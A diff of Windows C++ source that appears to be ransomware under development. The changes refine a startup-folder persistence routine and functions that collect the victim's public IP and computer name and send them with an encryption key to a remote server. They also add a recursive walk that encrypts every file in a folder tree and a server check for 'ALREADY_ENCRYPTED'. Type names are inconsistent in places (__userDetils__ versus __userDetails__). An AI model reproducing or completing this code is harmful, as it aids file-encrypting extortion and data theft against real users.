@@ -4,8 +4,8 @@
 #include <stdlib.h>
 
 
+
 uint32_t FULL_NUM_FOR_FILE_HANDLE = 0;
-std::map<int, __userDetails__> userDetails;
 
 bool IsAdministrator(HRESULT& rHr)
 {
@@ -42,15 +42,14 @@ bool IsAdministrator(HRESULT& rHr)
     return bIsAdmin;
 }
 
-// Function to add the program to the startup folder
-bool add_to_startup(const std::string& path)
+bool add_to_startup(std::string& path)
 {
     WCHAR startupFolderPath[MAX_PATH];
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupFolderPath)))
     {
         std::wstring shortcutPath = std::wstring(startupFolderPath) + L"\\startup.lnk";
 
-        HRESULT hr = CoInitialize(NULL);
+        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED); // Change to COINIT_MULTITHREADED
         if (FAILED(hr))
         {
             std::cerr << "Failed to initialize COM library." << std::endl;
@@ -62,7 +61,7 @@ bool add_to_startup(const std::string& path)
         if (FAILED(hr))
         {
             std::cerr << "Failed to create a shell link." << std::endl;
-            CoUninitialize();
+            CoUninitialize(); // Uninitialize COM before returning
             return false;
         }
 
@@ -74,7 +73,7 @@ bool add_to_startup(const std::string& path)
         if (FAILED(hr))
         {
             std::cerr << "Failed to query IPersistFile interface." << std::endl;
-            CoUninitialize();
+            CoUninitialize(); // Uninitialize COM before returning
             return false;
         }
 
@@ -82,11 +81,11 @@ bool add_to_startup(const std::string& path)
         if (FAILED(hr))
         {
             std::cerr << "Failed to save the shortcut." << std::endl;
-            CoUninitialize();
+            CoUninitialize(); // Uninitialize COM before returning
             return false;
         }
 
-        CoUninitialize();
+        CoUninitialize(); // Ensure COM is uninitialized
         return true;
     }
     else
@@ -198,7 +197,7 @@ std::string fetch_ip_address()
     if (!conn)
     {
         std::cerr << "Failed to open URL." << std::endl;
-        InternetCloseHandle(net);
+        InternetCloseHandle(net); // Properly close handle
         return "Error";
     }
 
@@ -217,8 +216,8 @@ std::string fetch_ip_address()
         result = "Error";
     }
 
-    InternetCloseHandle(conn);
-    InternetCloseHandle(net);
+    InternetCloseHandle(conn); // Close handle after reading
+    InternetCloseHandle(net);  // Close handle after reading
     return result;
 }
 
@@ -250,9 +249,9 @@ SOCKET connect_to_server()
 	return clientSocket;
 }
 
-bool send_data_to_server(SOCKET clientSocket, int key, std::string public_ip)
+bool send_data_to_server(SOCKET clientSocket, int key, __userDetils__ userDetails)
 {
-	std::string data = conccet_ip_and_computer_name(key);
+	std::string data = conccet_ip_and_computer_name(key, &userDetails);
     int result = send(clientSocket, data.c_str(), data.length(), 0);
 
     if (result == SOCKET_ERROR) 
@@ -261,66 +260,96 @@ bool send_data_to_server(SOCKET clientSocket, int key, std::string public_ip)
     }
     return true;
 }
-void saveStrucetInFile(__userDetails__* user_details)
+void saveStrucetInFile(__userDetils__ user_details)
 {
-    std::ofstream file("user_details.txt", std::ios::app);
-    if (!file.is_open()) 
+    std::ofstream file("user_details.txt");
+    if (!file.is_open())
     {
         std::cerr << "Failed to open the file." << std::endl;
         return;
+    }
+    else
+    {
+        std::cout << "Writing\n";
     }
     
     FULL_NUM_FOR_FILE_HANDLE++;
 
     // Formatting the structure into a string
     file << "__userDetails__ " << FULL_NUM_FOR_FILE_HANDLE << "\n{\n";
-    file << "\tstd::string ComputerName: " << user_details->ComputerName << ";\n";
-    file << "\tstd::string UserIP: " << user_details->UserIP << ";\n";
-    file << "\tuint32_t key: " << user_details->key << ";\n";
+    file << "\tstd::string ComputerName: " << user_details.ComputerName << ";\n";
+    file << "\tstd::string UserIP: " << user_details.UserIP << ";\n";
+    file << "\tuint32_t key: " << user_details.key << ";\n";
     file << "}__userDetails__;\n";
 
     file.close();
 }
 
-std::string conccet_ip_and_computer_name(size_t public_key) 
+std::string conccet_ip_and_computer_name(size_t public_key, __userDetils__* user_detail)
 {
     std::string public_ip = fetch_ip_address();
     std::string computer_name = fetch_computer_name();
     std::string key_str = std::to_string(public_key);
-    __userDetails__* userDetail = (__userDetails__*)malloc(sizeof(__userDetails__));
 
+    // Access members using the arrow operator
+    user_detail->UserIP = public_ip;
+    user_detail->ComputerName = computer_name;
+    user_detail->key = public_key;
 
-    userDetail->UserIP = public_ip;
-    userDetail->ComputerName = computer_name;
+    //saveStrucetInFile(*user_detail);  // Corrected the function name
 
-
-    std::string ip_and_computer_name = public_ip + "," + computer_name + "," + key_str;
-    return ip_and_computer_name;
+    return computer_name + "," + public_ip + "," + key_str;
 }
 
 bool get_file_folders(int key, std::string folder_path, std::string start, int mode)
 {
     namespace fs = std::filesystem;
-
-    for (auto& entry : fs::directory_iterator(folder_path))
+    try
     {
-        std::string file_path = entry.path().string();
-
-        if (find_folder(file_path))
+        if (!fs::is_directory(folder_path))
         {
-            get_file_folders(key, file_path, start + "\t", mode);  // Add an extra tab for the next level of recursion
+            std::cerr << "Path is not a directory: " << folder_path << std::endl;
+            return false;
         }
-        else
-        {   
-			std::cout << start << file_path << std::endl;
-            bool a = 0;
-            if (mode == 1 ? a = EN_DEcrypt_file_folders(key, file_path) : EN_DEcrypt_file_folders(key, file_path));
 
+        for (auto& entry : fs::directory_iterator(folder_path, fs::directory_options::skip_permission_denied))
+        {
+            const std::string file_path = entry.path().string();
+
+            // Check if the current entry is a directory
+            if (fs::is_directory(entry.status()))
+            {
+                std::cout << "Entering folder: " << file_path << std::endl;
+                get_file_folders(key, file_path, start + "\t", mode);  // Recursive call
+            }
+            else
+            {
+                std::cout << "Processing file: " << file_path << std::endl;
+
+                if (mode == 1)
+                {
+                    if (!EN_DEcrypt_file_folders(key, file_path))
+                    {
+                        std::cerr << "Failed to encrypt/decrypt file: " << file_path << std::endl;
+                    }
+                }
+            }
         }
+    }
+    catch (const fs::filesystem_error& error)
+    {
+        std::cerr << "Filesystem error: " << error.what() << " at: " << folder_path << std::endl;
+        return false;
+    }
+    catch (const std::exception& error)
+    {
+        std::cerr << "General error: " << error.what() << " at: " << folder_path << std::endl;
+        return false;
     }
 
     return true;
 }
+
 
 bool EN_DEcrypt_file_folders(int key, std::string file_path)
 {
@@ -375,7 +404,56 @@ bool check_for_exe_file(std::string file_name)
 {
     return file_name.find(".exe") != std::string::npos;
 }
+
 bool find_folder(std::string file_name)
 {
 	return file_name.find(".") == std::string::npos;
+}
+
+void printStructure(__userDetils__ userDetils)
+{
+    std::cout << "__userDetails__\n{\n";
+    std::cout << "\tstd::string ComputerName: " << userDetils.ComputerName << ";\n";
+    std::cout << "\tstd::string UserIP: " << userDetils.UserIP << ";\n";
+    std::cout << "\tuint32_t key: " << userDetils.key << ";\n";
+    std::cout << "}__userDetails__;\n";
+}
+
+bool alreadyEncrypted(SOCKET socket, __userDetils__ userDetails)
+{
+    std::string data = conccet_ip_and_computer_name(userDetails.key, &userDetails);
+    int result = send(socket, data.c_str(), data.length(), 0);
+    
+    if (result == SOCKET_ERROR)
+    {
+        return true; // If there's a socket error, return true (assuming already encrypted).
+    }
+
+    // Buffer to receive response from the socket
+    char buffer[1024];
+    result = recv(socket, buffer, sizeof(buffer), 0);
+
+    if (result > 0)
+    {
+        // Process the response received from the server
+        std::string response(buffer, result);
+
+        // Check the response content
+        if (response == "ALREADY_ENCRYPTED")
+        {
+            return true; // If the response indicates encryption, return true
+        }
+    }
+    else if (result == 0)
+    {
+        // Connection closed
+        std::cerr << "Connection closed by the server." << std::endl;
+    }
+    else
+    {
+        // Receiving error
+        std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
+    }
+
+    return false;
 }
